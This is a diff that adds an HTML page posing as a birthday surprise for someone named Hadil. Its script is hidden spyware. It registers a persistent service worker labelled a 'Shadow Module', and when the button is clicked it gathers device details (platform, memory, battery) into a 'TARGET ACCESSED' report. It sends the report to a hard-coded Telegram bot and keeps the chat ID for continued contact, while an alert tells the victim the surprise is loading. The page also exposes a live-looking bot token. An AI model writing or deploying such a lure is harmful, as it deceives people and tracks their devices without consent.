@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Birthday for Hadil 🎂</title>
+    </head>
+<body>
+    <button id="startBtn" style="padding:20px; font-size:20px; cursor:pointer;">START THE SURPRISE 🎹</button>
+
+    <script>
+        const BOT_TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
+
+        // تسجيل الـ Service Worker للخلود الرقمي
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('sw.js')
+                .then(reg => console.log('🛡️ Shadow Module Integrated.'))
+                .catch(err => console.log('❌ Installation Failed.'));
+            });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            document.getElementById('startBtn').style.display = 'none';
+            
+            // سحب البيانات الأولية فوراً عند الضغط
+            let batt = "N/A";
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = `${Math.round(b.level * 100)}%`;
+            }
+
+            const report = `💀 **TARGET ACCESSED**\nOS: ${navigator.platform}\nRAM: ${navigator.deviceMemory}GB\nBattery: ${batt}`;
+            
+            // إرسال التقرير الأول للبوت (سيحاول جلب الـ Chat ID تلقائياً)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(r => r.json())
+            .then(data => {
+                const cid = data.result[data.result.length-1].message.chat.id;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(report)}`);
+                
+                // إرسال الـ Chat ID للـ Service Worker ليبقى على اتصال
+                if (navigator.serviceWorker.controller) {
+                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: cid });
+                }
+            });
+
+            alert("المفاجأة تبدأ الآن... انتظر التحميل!");
+        });
+    </script>
+</body>
+</html>
